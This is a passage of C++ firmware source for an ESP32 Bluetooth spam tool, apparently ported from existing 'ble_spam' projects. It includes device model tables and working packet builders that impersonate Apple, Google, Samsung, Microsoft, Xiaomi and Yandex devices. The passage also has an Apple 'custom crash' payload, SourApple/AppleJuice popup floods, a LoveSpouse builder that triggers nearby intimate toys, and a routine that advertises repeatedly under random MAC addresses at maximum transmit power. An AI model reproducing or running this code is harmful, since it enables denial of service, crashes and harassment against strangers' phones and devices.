    {0xC6ABEA, "UA JBL True Wireless Flash X", "JBL"},
    {0xC6EC5F, "SRS-XE300", "Sony"},
    {0xC7736C, "Philips PH805", "Philips"},
    {0xC79B91, "Jabra Evolve2 75", "Jabra"},
    {0xC7A267, "Fake Test Mouse", "Other"},
    {0xC7D620, "JBL Pulse 5", "JBL"},
    {0xC7FBCC, "JBL VIBE FLEX", "JBL"},
    {0xC8162A, "LinkBuds S", "Sony"},
    {0xC85D7A, "JBL ENDURANCE PEAK II", "JBL"},
    {0xC8777E, "Jaybird Vista 2", "Jaybird"},
    {0xC878AA, "SRS-XV800", "Sony"},
    {0xC8C641, "Redmi Buds 4 Lite", "Xiaomi"},
    {0xC8D335, "WF-1000XM4", "Sony"},
    {0xC8E228, "Pixel Buds Pro", "Google"},
    {0xC9186B, "WF-1000XM4", "Sony"},
    {0xC9836A, "JBL Xtreme 4", "JBL"},
    {0xCA7030, "ATH-TWX7", "Audio-Technica"},
    {0xCAB6B8, "ATH-M20xBT", "Audio-Technica"},
    {0xCAF511, "Jaybird Vista 2", "Jaybird"},
    {0xCB093B, "Urbanears Juno", "Urbanears"},
    {0xCB529D, "soundcore Glow", "Soundcore"},
    {0xCC438E, "WH-1000XM4", "Sony"},
    {0xCC5F29, "JBL TUNE660NC", "JBL"},
    {0xCC754F, "YY2963", "Other"},
    {0xCC93A5, "Sync", "Sync"},
    {0xCCBB7E, "MIDDLETON", "Other"},
    {0xD5A59E, "Jabra Elite Speaker", "Jabra"},
    {0xD5B5F7, "MOTO BUDS 600 ANC", "Motorola"},
    {0xD5C6CE, "realme TechLife Buds T100", "Realme"},
    {0xD654CD, "JBL Xtreme 4", "JBL"},
    {0xD65F4E, "Philips Fidelio T2", "Philips"},
    {0xD69B2B, "TONE-T80S", "LG"},
    {0xD6C195, "LG HBS-SL5", "LG"},
    {0xD6E870, "Beoplay EX", "B&O"},
    {0xD6EE84, "Rockerz 255 Max", "boAt"},
    {0xD7102F, "ATH-SQ1TW SVN", "Audio-Technica"},
    {0xD7E3EB, "Cleer HALO", "Cleer"},
    {0xD8058C, "MOTIF II A.N.C.", "Other"},
    {0xD820EA, "WH-XB910N", "Sony"},
    {0xD87A3E, "Pixel Buds Pro", "Google"},
    {0xD8F3BA, "WH-1000XM5", "Sony"},
    {0xD8F4E8, "realme Buds T100", "Realme"},
    {0xD90617, "Redmi Buds 4 Active", "Xiaomi"},
    {0xD933A7, "JBL ENDURANCE PEAK 3", "JBL"},
    {0xD9414F, "JBL SOUNDGEAR SENSE", "JBL"},
    {0xD97EBA, "JBL TUNE125TWS", "JBL"},
    {0xD9964B, "JBL TUNE670NC", "JBL"},
    {0xDA0F83, "SPACE", "Space"},
    {0xDA4577, "Jabra Elite 4 Active", "Jabra"},
    {0xDA5200, "blackbox TRIP II", "Blackbox"},
    {0xDAD3A6, "Jabra Elite 10", "Jabra"},
    {0xDAE096, "adidas RPT-02 SOL", "Adidas"},
    {0xDB8AC7, "LG TONE-FREE", "LG"},
    {0xDC5249, "WH-H810 (h.ear)", "Sony"},
    {0xDCF33C, "JBL REFLECT MINI NC", "JBL"},
    {0xDD4EC0, "OPPO Enco Air3 Pro", "OPPO"},
    {0xDE577F, "Teufel AIRY TWS 2", "Teufel"},
    {0xDEC04C, "SUMMIT", "Summit"},
    {0xDEDD6F, "soundcore Space One", "Soundcore"},
    {0xDEE8C0, "Ear (2)", "Nothing"},
    {0xDEEA86, "Xiaomi Buds 4 Pro", "Xiaomi"},
    {0xDEF234, "WH-H810 (h.ear)", "Sony"},
    {0xDF01E3, "Sync", "Sync"},
    {0xDF271C, "Big Bang e Gen 3", "Other"},
    {0xDF42DE, "TAG Heuer Calibre E4 42mm", "TAG Heuer"},
    {0xDF4B02, "SRS-XB13", "Sony"},
    {0xDF9BA4, "Bose NC 700 Headphones", "Bose"},
    {0xDFD433, "JBL REFLECT AERO", "JBL"},
    {0xE020C1, "soundcore Motion 300", "Soundcore"},
    {0xE06116, "LinkBuds S", "Sony"},
    {0xE07634, "OnePlus Buds Z", "OnePlus"},
    {0xE09172, "JBL TUNE BEAM", "JBL"},
    {0xE4E457, "Galaxy S20 5G", "Samsung"},
    {0xE5440B, "TAG Heuer Calibre E4 45mm", "TAG Heuer"},
    {0xE57363, "Oladance Wearable Stereo", "Other"},
    {0xE57B57, "Super Device", "Other"},
    {0xE5B91B, "SRS-XB33", "Sony"},
    {0xE5E2E9, "Zone Wireless 2", "Other"},
    {0xE64613, "JBL WAVE BEAM", "JBL"},
    {0xE69877, "JBL REFLECT AERO", "JBL"},
    {0xE6E37E, "realme Buds Air 5 Pro", "Realme"},
    {0xE6E771, "ATH-CKS50TW", "Audio-Technica"},
    {0xE6E8B8, "POCO Pods", "Other"},
    {0xE750CE, "Jabra Evolve2 75", "Jabra"},
    // Java/Kotlin port: models present in fastpair_models but missing from select_list
    {0x109201, "Beoplay H9 3rd Generation", "B&O"},
    {0x532011, "Big Bang e Gen 3", "Other"},
    {0x0052DA, "blackbox TRIP II", "Blackbox"},
    {0x124366, "BLE-Phone", "Other"},
    {0x641630, "boAt Airdopes 452", "boAt"},
    {0xDADE43, "Chromebox", "Google"},
    {0x549547, "JBL WAVE BUDS", "JBL"},
    {0x861698, "LinkBuds", "Sony"},
    {0x596007, "MOTIF II A.N.C.", "Other"},
    {0x855347, "NIRVANA NEBULA", "Nirvana"},
    {0x612907, "Xiaomi Redmi Buds 4 Lite", "Xiaomi"},
    {0x614199, "Oraimo FreePods Pro", "Oraimo"},
    {0x625740, "LG-TONE-NP3", "LG"},
    {0x706908, "Sony WH-1000XM3", "Sony"},
    {0x837980, "Sony WH-1000XM3", "Sony"},
    {0xCB2FE7, "soundcore Motion X500", "Soundcore"},
    {0x567679, "Pixel Buds Pro", "Google"},
    {0x284500, "Plantronics PLT_K2", "Plantronics"},
    {0xE64CC6, "Set up your new Pixel 3 XL", "Google"},
    {0x8D5B67, "Pixel 90c", "Google"},
    {0xE5B4B0, "WF-1000XM5", "Sony"},
    {0xDE215D, "WF-C500", "Sony"},
    // New 2024 devices from Kotlin port
    {0xDA9B43, "Pixel Buds Pro 2", "Google"},
    {0xE6B2D4, "Nothing Ear (3)", "Nothing"},
    {0x9B4B6A, "Nothing Ear (a)", "Nothing"},
    {0xA7C128, "Samsung Galaxy Buds 3", "Samsung"},
    {0xB8D241, "Samsung Galaxy Buds 3 Pro", "Samsung"},
    {0xC9E352, "Samsung Galaxy Buds FE", "Samsung"},
    {0xF1A234, "OnePlus Buds 3", "OnePlus"},
    {0xD2B345, "Anker Soundcore Liberty 4 Pro", "Soundcore"},
};
static const int fastpair_select_count = sizeof(fastpair_select_list) / sizeof(fastpair_select_list[0]);

static uint32_t g_fastpair_model_override = 0;

// ============================================================================
// Samsung EasySetup — buds and watch models
// ============================================================================
static const uint32_t samsung_buds_models[] = {
    0xEE7A0C, 0x9D1700, 0x39EA48, 0xA7C62C, 0x850116, 0x3D8F41, 0x3B6D02,
    0xAE063C, 0xB8B905, 0xEAAA17, 0xD30704, 0x9DB006, 0x101F1A, 0x859608,
    0x8E4503, 0x2C6740, 0x3F6718, 0x42C519, 0xAE073A, 0x011716,
};

static const uint8_t samsung_watch_models[] = {
    0x1A, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A,
    0x0B, 0x0C, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0xE4,
    0xE5, 0x1B, 0x1C, 0x1D, 0x1E, 0x20, 0xEC, 0xEF,
};

// ============================================================================
// LoveSpouse — toy control protocol (Typo Products, LLC 0x00FF)
// Ported from Momentum-Apps protocol_lovespouse
// ============================================================================
static const uint32_t lovespouse_play_modes[] = {
    0xE49C6C, 0xE7075E, 0xE68E4F, 0xE1313B, 0xE0B82A, 0xE32318, 0xE2AA09,
    0xED5DF1, 0xECD4E0, 0xD41F5D, 0xD7846F, 0xD60D7E, 0xD1B20A, 0xD0B31B,
    0xD3A029, 0xD22938, 0xDDDEC0, 0xDC57D1, 0xA4982E, 0xA7031C, 0xA68A0D,
    0xA13579, 0xA0BC68, 0xA3275A, 0xA2AE4B, 0xAD59B3, 0xACD0A2,
};

static const uint32_t lovespouse_stop_modes[] = {
    0xE5157D, 0xD5964C, 0xA5113F,
};

// ============================================================================
// Helpers
// ============================================================================
static char randomNameBuffer[32];

// Settings (customizable via Spam Settings menu) — declared early for generateRandomName
static uint32_t g_spam_delay_ms = 30;
static bool g_use_custom_names = false;
static std::vector<String> g_custom_names;

void generateRandomMac(uint8_t *mac) {
    esp_fill_random(mac, 6);
    mac[0] = (mac[0] & 0xFE) | 0x02;
}

static const char *generateRandomName(void) {
    if (g_use_custom_names && g_custom_names.size() > 0) {
        return g_custom_names[esp_random() % g_custom_names.size()].c_str();
    }
    static const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    int len = (esp_random() % 7) + 2;
    if (len > 31) len = 31;
    for (int i = 0; i < len; i++)
        randomNameBuffer[i] = charset[esp_random() % (sizeof(charset) - 1)];
    randomNameBuffer[len] = '\0';
    return randomNameBuffer;
}

static inline size_t array_len(const uint8_t *arr, size_t elem_size, size_t arr_size) {
    (void)arr;
    return arr_size / elem_size;
}

// ============================================================================
// Apple Continuity packet builders
// Ported directly from ble_spam.c — these are the working packet formats
// ============================================================================

static size_t build_continuity_proximity_pair(uint8_t *buf) {
    size_t count = sizeof(continuity_pp_models) / sizeof(continuity_pp_models[0]);
    uint16_t model = continuity_pp_models[esp_random() % count];

    uint8_t prefix;
    if (model == 0x0055 || model == 0x0030)
        prefix = 0x05;
    else
        prefix = (esp_random() % 2) ? 0x07 : 0x01;

    uint8_t color = esp_random() % 16;

    uint8_t i = 0;
    buf[i++] = 30;
    buf[i++] = 0xFF;
    buf[i++] = 0x4C;
    buf[i++] = 0x00;
    buf[i++] = 0x07;
    buf[i++] = 25;

    buf[i++] = prefix;
    buf[i++] = (model >> 8) & 0xFF;
    buf[i++] = model & 0xFF;
    buf[i++] = 0x55;
    buf[i++] = ((esp_random() % 10) << 4) | (esp_random() % 10);
    buf[i++] = ((esp_random() % 8)  << 4) | (esp_random() % 10);
    buf[i++] = esp_random() & 0xFF;
    buf[i++] = color;
    buf[i++] = 0x00;
    esp_fill_random(&buf[i], 16);
    i += 16;

    return i;
}

static size_t build_continuity_nearby_action(uint8_t *buf) {
    size_t count = sizeof(continuity_na_actions) / sizeof(continuity_na_actions[0]);
    uint8_t action = continuity_na_actions[esp_random() % count];

    uint8_t flags = 0xC0;
    if (action == 0x20 && (esp_random() % 2)) flags--;
    if (action == 0x09 && (esp_random() % 2)) flags = 0x40;

    uint8_t i = 0;
    buf[i++] = 10;
    buf[i++] = 0xFF;
    buf[i++] = 0x4C;
    buf[i++] = 0x00;
    buf[i++] = 0x0F;
    buf[i++] = 5;
    buf[i++] = flags;
    buf[i++] = action;
    esp_fill_random(&buf[i], 3);
    i += 3;

    return i;
}

static size_t build_continuity_custom_crash(uint8_t *buf) {
    size_t count = sizeof(continuity_na_actions) / sizeof(continuity_na_actions[0]);
    uint8_t action = continuity_na_actions[esp_random() % count];
    uint8_t flags  = 0xC0;
    if (action == 0x20 && (esp_random() % 2)) flags--;
    if (action == 0x09 && (esp_random() % 2)) flags = 0x40;

    uint8_t i = 0;
    buf[i++] = 16;
    buf[i++] = 0xFF;
    buf[i++] = 0x4C;
    buf[i++] = 0x00;
    buf[i++] = 0x0F;
    buf[i++] = 5;
    buf[i++] = flags;
    buf[i++] = action;
    esp_fill_random(&buf[i], 3);
    i += 3;
    buf[i++] = 0x00;
    buf[i++] = 0x00;
    buf[i++] = 0x10;
    esp_fill_random(&buf[i], 3);
    i += 3;

    return i;
}

static size_t build_apple_continuity_adv(uint8_t *buf) {
    switch (esp_random() % 3) {
        case 0:  return build_continuity_proximity_pair(buf);
        case 1:  return build_continuity_nearby_action(buf);
        default: return build_continuity_custom_crash(buf);
    }
}

// ============================================================================
// Google Fast Pair packet builder
// ============================================================================
static size_t build_fastpair_adv(uint8_t *buf) {
    uint32_t model;
    if (g_fastpair_model_override != 0) {
        model = g_fastpair_model_override;
    } else {
        size_t count = sizeof(fastpair_models) / sizeof(fastpair_models[0]);
        model = fastpair_models[esp_random() % count];
    }

    uint8_t i = 0;
    // Flags: LE General Discoverable, BR/EDR Not Supported
    buf[i++] = 2;
    buf[i++] = 0x01;
    buf[i++] = 0x06;
    // Complete list of 16-bit UUIDs: Google Fast Pair (0xFE2C)
    buf[i++] = 3;
    buf[i++] = 0x03;
    buf[i++] = 0x2C;
    buf[i++] = 0xFE;
    // Service Data - 16-bit UUID: Google Fast Pair + Model ID
    buf[i++] = 6;
    buf[i++] = 0x16;
    buf[i++] = 0x2C;
    buf[i++] = 0xFE;
    buf[i++] = (model >> 16) & 0xFF;
    buf[i++] = (model >>  8) & 0xFF;
    buf[i++] = model & 0xFF;
    // TX Power Level
    buf[i++] = 2;
    buf[i++] = 0x0A;
    buf[i++] = (uint8_t)((esp_random() % 120) - 100);

    return i;
}

// ============================================================================
// Xiaomi QuickConnect — manufacturer 0x038F
// Ported from com.tutozz.blespam.XiaomiQuickConnect
// ============================================================================
static size_t build_xiaomi_quickconnect_adv(uint8_t *buf) {
    uint8_t i = 0;
    buf[i++] = 2;  buf[i++] = 0x01; buf[i++] = 0x06;
    // 24 bytes manufacturer data (company 0x038F)
    buf[i++] = 27; buf[i++] = 0xFF; buf[i++] = 0x8F; buf[i++] = 0x03;
    // Prefix: 16 01 20
    buf[i++] = 0x16; buf[i++] = 0x01; buf[i++] = 0x20;
    // Byte 1 (usually A1)
    buf[i++] = 0xA1;
    // Byte 2 (usually 42 or 4E)
    buf[i++] = (esp_random() % 2) ? 0x42 : 0x4E;
    // Middle: 17 0A 00 00 00 00 88 50 11 B1 FF
    buf[i++] = 0x17; buf[i++] = 0x0A; buf[i++] = 0x00; buf[i++] = 0x00;
    buf[i++] = 0x00; buf[i++] = 0x00; buf[i++] = 0x88; buf[i++] = 0x50;
    buf[i++] = 0x11; buf[i++] = 0xB1; buf[i++] = 0xFF;
    // Value: 0x0320..0x0350 (2 bytes)
    uint16_t value = 0x0320 + (esp_random() % 0x0031);
    buf[i++] = (value >> 8) & 0xFF;
    buf[i++] = value & 0xFF;
    // Suffix: 00 00 00 00 00 00
    buf[i++] = 0x00; buf[i++] = 0x00; buf[i++] = 0x00;
    buf[i++] = 0x00; buf[i++] = 0x00; buf[i++] = 0x00;

    return i;
}

// ============================================================================
// Yandex Spam — manufacturer 0x0905
// Ported from com.tutozz.blespam.YandexSpam
// ============================================================================
static size_t build_yandex_spam_adv(uint8_t *buf) {
    static const uint16_t yandex_payloads[] = {
        0x1D3B, // Station 2 BLUE WOT
        0x1D4B, // Station 2 Black WOT
        0x094B, // Duo Max
        0x074B, // Station 2
        0x054B, // Station Lite
        0x064B, // Station Mini 1
        0x1E4B, // Station 3
        0x1A4B, // Tv station 2
        0x024B, // Station Max
        0x124B, // Fiero Hi
        0x104B, // Midi
        0x114B, // Lite 2 Black WT
        0x113B, // Lite 2 BLUE WT
        0x134B, // Station Mini 3 pro
        0x144B, // Camera
        0x154B, // Mini 3
        0x164B, // Stret
        0x184B, // Tv station Basic
        0x044B, // Station Mini 2 WT
        0x0F4B, // Smart Display Xiaomi
        0x0D4B, // Tv station
        0x0A4B, // Xab
        0x0C4B, // Yandex TV
    };
    size_t count = sizeof(yandex_payloads) / sizeof(yandex_payloads[0]);
    uint16_t payload = yandex_payloads[esp_random() % count];

    uint8_t i = 0;
    buf[i++] = 2;  buf[i++] = 0x01; buf[i++] = 0x06;
    // Manufacturer data (company 0x0905) — 2 bytes payload
    buf[i++] = 4;  buf[i++] = 0xFF; buf[i++] = 0x05; buf[i++] = 0x09;
    buf[i++] = (payload >> 8) & 0xFF;
    buf[i++] = payload & 0xFF;

    return i;
}

// ============================================================================
// Samsung EasySetup packet builders
// ============================================================================
static size_t build_samsung_buds_adv(uint8_t *buf) {
    size_t count = sizeof(samsung_buds_models) / sizeof(samsung_buds_models[0]);
    uint32_t model = samsung_buds_models[esp_random() % count];

    uint8_t i = 0;
    buf[i++] = 27;  buf[i++] = 0xFF; buf[i++] = 0x75; buf[i++] = 0x00;
    buf[i++] = 0x42; buf[i++] = 0x09; buf[i++] = 0x81; buf[i++] = 0x02;
    buf[i++] = 0x14; buf[i++] = 0x15; buf[i++] = 0x03; buf[i++] = 0x21;
    buf[i++] = 0x01; buf[i++] = 0x09;
    buf[i++] = (model >> 16) & 0xFF;
    buf[i++] = (model >>  8) & 0xFF;
    buf[i++] = 0x01;
    buf[i++] = model & 0xFF;
    buf[i++] = 0x06; buf[i++] = 0x3C; buf[i++] = 0x94; buf[i++] = 0x8E;
    buf[i++] = 0x00; buf[i++] = 0x00; buf[i++] = 0x00; buf[i++] = 0x00;
    buf[i++] = 0xC7; buf[i++] = 0x00;
    buf[i++] = 16;  buf[i++] = 0xFF; buf[i++] = 0x75;

    return i;
}

static size_t build_samsung_watch_adv(uint8_t *buf) {
    size_t count = sizeof(samsung_watch_models) / sizeof(samsung_watch_models[0]);
    uint8_t model = samsung_watch_models[esp_random() % count];

    uint8_t i = 0;
    buf[i++] = 14;  buf[i++] = 0xFF; buf[i++] = 0x75; buf[i++] = 0x00;
    buf[i++] = 0x01; buf[i++] = 0x00; buf[i++] = 0x02; buf[i++] = 0x00;
    buf[i++] = 0x01; buf[i++] = 0x01; buf[i++] = 0xFF; buf[i++] = 0x00;
    buf[i++] = 0x00; buf[i++] = 0x43; buf[i++] = model;

    return i;
}

static size_t build_samsung_adv(uint8_t *buf) {
    if (esp_random() % 2)
        return build_samsung_buds_adv(buf);
    else
        return build_samsung_watch_adv(buf);
}

// ============================================================================
// Microsoft SwiftPair packet builder
// ============================================================================
static size_t build_swiftpair_adv(uint8_t *buf, const char *customName) {
    const char *name;
    uint8_t name_len;

    if (customName && strlen(customName) > 0) {
        name = customName;
        name_len = strlen(customName);
    } else {
        name = generateRandomName();
        name_len = strlen(name);
    }

    uint8_t i = 0;
    uint8_t size = 7 + name_len;
    buf[i++] = size - 1;
    buf[i++] = 0xFF;
    buf[i++] = 0x06;
    buf[i++] = 0x00;
    buf[i++] = 0x03;
    buf[i++] = 0x00;
    buf[i++] = 0x80;
    memcpy(&buf[i], name, name_len);
    i += name_len;

    return i;
}

// ============================================================================
// LoveSpouse packet builder
// ============================================================================
static size_t build_lovespouse_adv(uint8_t *buf, bool play) {
    const uint32_t *modes;
    size_t count;
    if (play) {
        modes = lovespouse_play_modes;
        count = sizeof(lovespouse_play_modes) / sizeof(lovespouse_play_modes[0]);
    } else {
        modes = lovespouse_stop_modes;
        count = sizeof(lovespouse_stop_modes) / sizeof(lovespouse_stop_modes[0]);
    }
    uint32_t mode = modes[esp_random() % count];

    uint8_t i = 0;
    buf[i++] = 2; buf[i++] = 0x01; buf[i++] = 0x06;
    buf[i++] = 14; buf[i++] = 0xFF; buf[i++] = 0xFF; buf[i++] = 0x00;
    buf[i++] = 0x6D; buf[i++] = 0xB6; buf[i++] = 0x43; buf[i++] = 0xCE;
    buf[i++] = 0x97; buf[i++] = 0xFE; buf[i++] = 0x42; buf[i++] = 0x7C;
    buf[i++] = (mode >> 16) & 0xFF;
    buf[i++] = (mode >>  8) & 0xFF;
    buf[i++] = mode & 0xFF;
    buf[i++] = 3; buf[i++] = 0x03; buf[i++] = 0x8F; buf[i++] = 0xAE;

    return i;
}

// ============================================================================
// NameFlood packet builder
// ============================================================================
static size_t build_nameflood_adv(uint8_t *buf, const char *name) {
    if (!name || strlen(name) == 0) name = generateRandomName();
    uint8_t name_len = strlen(name);
    if (name_len > 18) name_len = 18;

    uint8_t i = 0;
    buf[i++] = 2; buf[i++] = 0x01; buf[i++] = 0x06;
    buf[i++] = name_len + 1; buf[i++] = 0x09;
    memcpy(&buf[i], name, name_len);
    i += name_len;
    buf[i++] = 3; buf[i++] = 0x02; buf[i++] = 0x12; buf[i++] = 0x18;
    buf[i++] = 2; buf[i++] = 0x0A; buf[i++] = 0x00;

    return i;
}

// ============================================================================
// BLE Beacon Spam builder
// Flags + Complete HID UUID + HID Keyboard Appearance + Random Name
// Triggers pairing prompts on iOS/Android via keyboard pairing UI
// ============================================================================
static size_t build_ble_beacon_adv(uint8_t *buf, const char *name) {
    if (!name || strlen(name) == 0) name = generateRandomName();
    uint8_t name_len = strlen(name);
    if (name_len > 20) name_len = 20;

    uint8_t i = 0;
    buf[i++] = 2; buf[i++] = 0x01; buf[i++] = 0x06;
    buf[i++] = 3; buf[i++] = 0x03; buf[i++] = 0x12; buf[i++] = 0x18;
    buf[i++] = 3; buf[i++] = 0x19; buf[i++] = 0x80; buf[i++] = 0x01;
    buf[i++] = name_len + 1; buf[i++] = 0x09;
    memcpy(&buf[i], name, name_len);
    i += name_len;

    return i;
}

// ============================================================================
// Legacy packet builders (SourApple / AppleJuice)
// ============================================================================
static const uint8_t IOS1[] = {
    0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14, 0x03, 0x0b, 0x0c, 0x11, 0x10, 0x05, 0x06, 0x09, 0x17, 0x12, 0x16
};
static const uint8_t IOS2[] = {0x01, 0x06, 0x20, 0x2b, 0xc0, 0x0d, 0x13, 0x27, 0x0b, 0x09, 0x02, 0x1e, 0x24};

static size_t build_sour_apple_adv(uint8_t *buf) {
    const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
    uint8_t i = 0;
    buf[i++] = 16;  buf[i++] = 0xFF; buf[i++] = 0x4C; buf[i++] = 0x00;
    buf[i++] = 0x0F; buf[i++] = 5;   buf[i++] = 0xC1;
    buf[i++] = types[esp_random() % (sizeof(types))];
    esp_fill_random(&buf[i], 3); i += 3;
    buf[i++] = 0x00; buf[i++] = 0x00;
    buf[i++] = 0x10;
    esp_fill_random(&buf[i], 3); i += 3;
    return i;
}

static size_t build_apple_juice_adv(uint8_t *buf) {
    if (esp_random() % 2) {
        buf[0] = 0x1e; buf[1] = 0xff; buf[2] = 0x4c; buf[3] = 0x00;
        buf[4] = 0x07; buf[5] = 0x19; buf[6] = 0x07;
        buf[7] = IOS1[esp_random() % sizeof(IOS1)];
        buf[8] = 0x20; buf[9] = 0x75; buf[10] = 0xaa; buf[11] = 0x30;
        buf[12] = 0x01; buf[13] = 0x00; buf[14] = 0x00; buf[15] = 0x45;
        buf[16] = 0x12; buf[17] = 0x12; buf[18] = 0x12;
        memset(&buf[19], 0x00, 7);
        return 26;
    } else {
        buf[0] = 0x16; buf[1] = 0xff; buf[2] = 0x4c; buf[3] = 0x00;
        buf[4] = 0x04; buf[5] = 0x04; buf[6] = 0x2a;
        memset(&buf[7], 0x00, 4);
        buf[11] = 0x0f; buf[12] = 0x05; buf[13] = 0xc1;
        buf[14] = IOS2[esp_random() % sizeof(IOS2)];
        buf[15] = 0x60; buf[16] = 0x4c; buf[17] = 0x95;
        buf[18] = 0x00; buf[19] = 0x00; buf[20] = 0x10;
        buf[21] = 0x00; buf[22] = 0x00;
        return 23;
    }
}

// ============================================================================
// GetUniversalAdvertisementData — builds NimBLE advertisement data for the
// five supported EBLEPayloadType protocols.
// Ported from the original ble_spam implementation.
// ============================================================================
static BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, String customName = "") {
    BLEAdvertisementData AdvData = BLEAdvertisementData();
    uint8_t *AdvData_Raw = nullptr;
    uint8_t i = 0;
#ifndef NIMBLE_V2_PLUS
    static std::vector<uint8_t> advDataVector;
#endif

    switch (Type) {
        case Microsoft: {
            const char *Name;
            uint8_t name_len;

            if (customName.length() > 0) {
                Name = customName.c_str();
                name_len = customName.length();
            } else {
                Name = generateRandomName();
                name_len = strlen(Name);
            }
            if (name_len > 31) name_len = 31;

            uint8_t AdvData_Raw_Local[7 + 31];
            AdvData_Raw = AdvData_Raw_Local;
            AdvData_Raw[i++] = 6 + name_len;
            AdvData_Raw[i++] = 0xFF;
            AdvData_Raw[i++] = 0x06;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x03;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x80;
            memcpy(&AdvData_Raw[i], Name, name_len);
            i += name_len;
#ifdef NIMBLE_V2_PLUS
            AdvData.addData(AdvData_Raw, 7 + name_len);
#else
            advDataVector.assign(AdvData_Raw, AdvData_Raw + 7 + name_len);
            AdvData.addData(advDataVector);
#endif
            break;
        }
        case AppleJuice: {
            int rand_val = esp_random() % 2;
            if (rand_val == 0) {
                uint8_t packet[26] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[esp_random() % sizeof(IOS1)],
                                      0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                                      0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                                      0x00, 0x00};
#ifdef NIMBLE_V2_PLUS
                AdvData.addData(packet, 26);
#else
                advDataVector.assign(packet, packet + 26);
                AdvData.addData(advDataVector);
#endif
            } else {
                uint8_t packet[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a,
                                      0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, IOS2[esp_random() % sizeof(IOS2)],
                                      0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00,
                                      0x00, 0x00};
#ifdef NIMBLE_V2_PLUS
                AdvData.addData(packet, 23);
#else
                advDataVector.assign(packet, packet + 23);
                AdvData.addData(advDataVector);
#endif
            }
            break;
        }
        case SourApple: {
            uint8_t packet[17];
            uint8_t j = 0;
            packet[j++] = 16;
            packet[j++] = 0xFF;
            packet[j++] = 0x4C;
            packet[j++] = 0x00;
            packet[j++] = 0x0F;
            packet[j++] = 5;
            packet[j++] = 0xC1;
            const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
            packet[j++] = types[esp_random() % sizeof(types)];
            esp_fill_random(&packet[j], 3);
            j += 3;
            packet[j++] = 0x00;
            packet[j++] = 0x00;
            packet[j++] = 0x10;
            esp_fill_random(&packet[j], 3);
#ifdef NIMBLE_V2_PLUS
            AdvData.addData(packet, 17);
#else
            advDataVector.assign(packet, packet + 17);
            AdvData.addData(advDataVector);
#endif
            break;
        }
        case Samsung: {
            uint8_t model = legacy_watch_models[esp_random() % 26].value;
            uint8_t Samsung_Data[15] = {
                0x0F,
                0xFF,
                0x75,
                0x00,
                0x01,
                0x00,
                0x02,
                0x00,
                0x01,
                0x01,
                0xFF,
                0x00,
                0x00,
                0x43,
                (uint8_t)((model >> 0x00) & 0xFF)
            };
#ifdef NIMBLE_V2_PLUS
            AdvData.addData(Samsung_Data, 15);
#else
            advDataVector.assign(Samsung_Data, Samsung_Data + 15);
            AdvData.addData(advDataVector);
#endif
            break;
        }
        case Google: {
            const uint32_t model = android_models[esp_random() % android_models_count];
            uint8_t Google_Data[14] = {
                0x03,
                0x03,
                0x2C,
                0xFE,
                0x06,
                0x16,
                0x2C,
                0xFE,
                (uint8_t)((model >> 0x10) & 0xFF),
                (uint8_t)((model >> 0x08) & 0xFF),
                (uint8_t)((model >> 0x00) & 0xFF),
                0x02,
                0x0A,
                (uint8_t)((esp_random() % 120) - 100)
            };
#ifdef NIMBLE_V2_PLUS
            AdvData.addData(Google_Data, 14);
#else
            advDataVector.assign(Google_Data, Google_Data + 14);
            AdvData.addData(advDataVector);
#endif
            break;
        }
        default: {
            break;
        }
    }

    return AdvData;
}

// ============================================================================
// executeSpam — per-packet BLE init/advertise/deinit cycle.
// Initializes BLE, sets random MAC, advertises for 20ms, then deinits.
// ============================================================================
static void executeSpam(EBLEPayloadType type, String customName = "") {
    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    esp_iface_mac_addr_set(macAddr, ESP_MAC_BT);

    BLEDevice::init("");
    vTaskDelay(5 / portTICK_PERIOD_MS);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
    pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type, customName);
    BLEAdvertisementData oScanResponseData = BLEAdvertisementData();

    advertisementData.setFlags(0x06);

    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->setScanResponseData(oScanResponseData);
    pAdvertising->setMinInterval(32);
    pAdvertising->setMaxInterval(48);
    pAdvertising->start();
    vTaskDelay(20 / portTICK_PERIOD_MS);

    pAdvertising->stop();
    vTaskDelay(5 / portTICK_PERIOD_MS);
#if defined(CONFIG_IDF_TARGET_ESP32C5)
    esp_bt_controller_deinit();
#else
    BLEDevice::deinit();
#endif
}

// ============================================================================
// executeCustomSpam — advertises a custom device name with HID service UUID
// and TX power level, triggering Bluetooth device discovery prompts.
// ============================================================================
static void executeCustomSpam(String spamName) {
    uint8_t macAddr[6];
    for (int i = 0; i < 6; i++) { macAddr[i] = esp_random() & 0xFF; }
    macAddr[0] = (macAddr[0] | 0xF0) & 0xFE;
    esp_iface_mac_addr_set(macAddr, ESP_MAC_BT);

    BLEDevice::init("sh4rk");
    vTaskDelay(5 / portTICK_PERIOD_MS);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
    pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData advertisementData = BLEAdvertisementData();

    advertisementData.setFlags(0x06);
    advertisementData.setName(spamName.c_str());
    pAdvertising->addServiceUUID(BLEUUID("1812"));
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->start();
    vTaskDelay(20 / portTICK_PERIOD_MS);
    pAdvertising->stop();
